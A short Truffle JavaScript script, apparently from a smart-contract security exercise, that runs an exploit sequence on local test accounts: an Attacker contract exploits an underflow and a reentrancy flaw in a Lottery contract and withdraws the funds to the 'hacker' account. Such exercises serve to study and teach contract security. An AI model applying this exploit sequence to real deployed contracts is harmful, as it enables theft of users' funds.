// Contracts
const Lottery = artifacts.require('./Lottery')
const Attacker = artifacts.require('./Attacker')

// Utils
//const DEFAULT_TEAM_ADDRESS = '0x0000000000000000000000000000000000000000'
const ether = (n) => {
  return new web3.utils.BN(
    web3.utils.toWei(n.toString(), 'ether')
  )
}

// const wait = (seconds) => {
//   const milliseconds = seconds * 1000
//   return new Promise(resolve => setTimeout(resolve, milliseconds))
// }

module.exports = async function(callback) {
  try {
    // Fetch accounts from wallet - these are unlocked in Ganache , not anymore on Metamask
    const accounts = await web3.eth.getAccounts()

    // Fetch the deployed lottery
    const lottery = await Lottery.deployed()
    console.log('lottery contract fetched', lottery.address)

    // Fetch the deployed reentrancy contract
    const attacker = await Attacker.deployed()
    console.log('attacker contract fetched', attacker.address)

    // set up users
    const hacker = accounts[0]
    const player1 = accounts[1]
    const player2 = accounts[2]

    // initialize attacker contract
    await attacker.initializeAttacker(lottery.address, { from: hacker })

    // register attacker's team
    await attacker.register({ from: hacker })

    // register other teams
    await lottery.registerTeam(player1, 'Team1', 'Password1', {from: player1, value:ether(2)})
    await lottery.registerTeam(player2, 'Team2', 'Password2', {from: player2, value:ether(2)})

    // exploit underflow vulnerability
    await attacker.guess({ from: hacker })

    // trigger reentrancy
    await attacker.attack({ from: hacker })

    // send money to the 1337 h4x0r
    await attacker.seeYa({ from: hacker })

  }
  catch(error) {
    console.log(error)
  }

  callback()
}